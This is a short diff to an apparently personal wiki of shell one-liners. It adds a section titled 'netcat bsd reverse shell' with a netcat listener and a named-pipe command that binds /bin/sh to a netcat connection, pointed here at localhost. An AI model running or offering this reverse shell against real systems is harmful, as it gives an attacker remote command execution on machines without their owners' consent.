@@ -60,3 +60,14 @@ sudo du -sh * | sort -hr | head -n10
 {{{bash
 netstat -tn 2>/dev/null | grep :22 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr
 }}}
+
+== netcat bsd reverse shell ==
+Listen:
+{{{bash
+nc -nvl 5555
+}}}
+
+Connect:
+{{{bash
+mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc localhost 5555 1>/tmp/backpipe
+}}}
